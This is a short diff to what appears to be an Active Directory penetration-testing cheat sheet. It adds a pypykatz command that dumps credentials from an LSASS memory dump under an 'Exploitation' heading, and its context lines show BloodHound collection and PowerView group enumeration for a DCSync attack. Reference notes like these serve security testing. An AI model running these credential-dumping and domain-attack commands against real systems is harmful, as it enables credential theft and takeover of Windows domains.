@@ -77,6 +77,11 @@ bloodhound-python -u 'USER' -p 'PASS' -d domain.dc -c All -o bloodhound_results.
 zip domainbh.zip *.json 
 ```
 # Exploitation
+```bash
+# Pypkayz to dump lsass
+pypykatz lsa minidump lsass.DMP
+```
+
 ## DCSync Attack
 ```bash
 # PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
